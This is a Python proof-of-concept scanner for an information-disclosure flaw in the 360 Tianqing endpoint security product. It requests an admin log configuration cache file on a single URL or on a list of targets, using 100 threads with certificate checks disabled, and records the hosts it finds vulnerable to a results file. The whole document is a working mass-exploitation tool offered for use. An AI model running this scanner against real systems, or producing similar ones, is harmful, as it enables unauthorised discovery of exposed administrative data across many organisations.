import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def banner():
    banner = """

 .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. |
| |    ______    | || |    ______    | || |     ____     | |
| |   / ____ `.  | || |  .' ____ \   | || |   .'    '.   | |
| |   `'  __) |  | || |  | |____\_|  | || |  |  .--.  |  | |
| |   _  |__ '.  | || |  | '____`'.  | || |  | |    | |  | |
| |  | \____) |  | || |  | (____) |  | || |  |  `--'  |  | |
| |   \______.'  | || |  '.______.'  | || |   '.____.'   | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------' 
                                                                                                     
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="360天擎信息泄露")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = '/runtime/admin_log_conf.cache'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'
    }
    try:
        res1 = requests.get(url=target + payload, timeout=10 , headers=headers ,verify=False)
        content = re.findall(r's:12:"(.*?)";',res1.text,re.S)
        if '/login/login' in content:
            print(f"[+]{target}存在360天擎信息泄露")
            with open('result9.txt','a',encoding='utf-8') as f:
                f.write(target + '\n')
        elif res1.status_code != 200:
            print(f"[+]该{target}可能存在问题请手动测试")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()